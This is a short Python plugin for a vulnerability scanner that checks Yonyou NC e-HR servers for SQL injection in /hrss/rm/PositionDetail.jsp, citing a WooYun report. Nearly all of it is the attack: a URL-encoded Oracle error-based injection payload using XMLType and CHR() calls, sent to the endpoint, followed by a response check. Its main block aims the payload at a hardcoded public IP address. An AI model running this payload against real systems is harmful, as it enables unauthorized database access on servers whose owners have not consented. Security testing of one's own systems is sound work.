#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name: 用友nc人力资源管理（e-HR）/hrss/rm/PositionDetail.jsp SQL注入漏洞

#Refer:http://www.wooyun.org/bugs/wooyun-2010-067917
#Data:2016/2/19

def assign(service, arg):
    if service == "yonyou_nc":
        return True, arg    

def audit(arg):
    vun_url= arg+"hrss/rm/PositionDetail.jsp?PK_EMPTY_JOB=1001A11000000000G9WA"
    payload="%27)%20AND%209542=(SELECT%20UPPER(XMLType(CHR(60)||CHR(58)||chr(116)||chr(101)||chr(115)||chr(116)||chr(118)||chr(117)||chr(108)))%20FROM%20DUAL)%20AND%20(%27Zelj%27=%27Zelj"
    code, head, res, errcode, _ = curl.curl2(vun_url+payload)
    if code==302 and "testvul" in head:
        security_hole(' sql injection:'+vun_url)
            
if __name__ == '__main__':
    from dummy import *
    audit(assign('yonyou_nc','http://219.140.193.253/')[1])